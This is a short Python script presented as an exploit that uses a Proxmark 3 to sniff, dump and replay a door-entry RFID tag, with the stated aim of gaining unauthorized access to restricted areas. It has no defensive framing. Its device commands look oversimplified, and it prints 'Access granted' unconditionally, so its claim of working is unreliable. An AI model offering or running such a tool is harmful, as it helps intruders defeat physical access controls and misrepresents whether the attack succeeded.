# -------------------------------------------
# RFID Access Control Exploit Using Proxmark 3
# -------------------------------------------
# Functionality:
# - Captures and clones RFID signals used by door entry systems.
# - Replays the cloned RFID tag to gain unauthorized access.

# Devices being used:
# - Proxmark 3: Captures and clones RFID signals.

# Example Usage:
# 1. Run the exploit to capture and replay the RFID signal to gain access:
#    python rfid_access_control.py

import subprocess

def exploit_rfid_access_control():
    """
    Exploits a door access system using RFID.
    Captures and replays the RFID signal to gain access to a restricted area.
    """
    print("[+] Attempting RFID exploit on door entry system...")
    subprocess.run(["proxmark3", "hf", "search"])  # Sniff for RFID tag
    subprocess.run(["proxmark3", "hf", "dump"])  # Capture RFID tag data
    subprocess.run(["proxmark3", "hf", "emulate"])  # Replay RFID tag to unlock the door
    print("[✔] Access granted using cloned RFID.")

# Run the exploit
if __name__ == "__main__":
    exploit_rfid_access_control()
